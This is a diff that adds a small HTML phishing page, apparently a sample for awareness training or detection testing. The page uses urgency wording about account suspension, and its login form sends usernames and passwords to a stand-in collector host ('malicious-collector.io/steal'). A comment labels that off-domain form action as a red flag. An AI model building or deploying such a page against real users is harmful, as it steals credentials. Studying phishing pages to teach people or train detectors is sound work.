@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="refresh" content="600">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Login - Update Your Account</title>
+</head>
+<body>
+    <h1>CRITICAL: Account Verification Required</h1>
+    <p>Please enter your <strong>credit card</strong> or <strong>social security</strong> details to avoid immediate suspension.</p>
+    
+    <!-- This form points to a different domain, which is a red flag -->
+    <form action="http://malicious-collector.io/steal" method="POST">
+        <div>
+            <label for="username">Username:</label>
+            <input type="text" id="username" name="username" placeholder="Email or Username">
+        </div>
+        <br>
+        <div>
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" placeholder="Password">
+        </div>
+        <br>
+        <button type="submit">Log In and Verify</button>
+    </form>
+
+    <hr>
+    <p>For your security, we recommend checking the URL in your browser's address bar.</p>
+</body>
+</html>
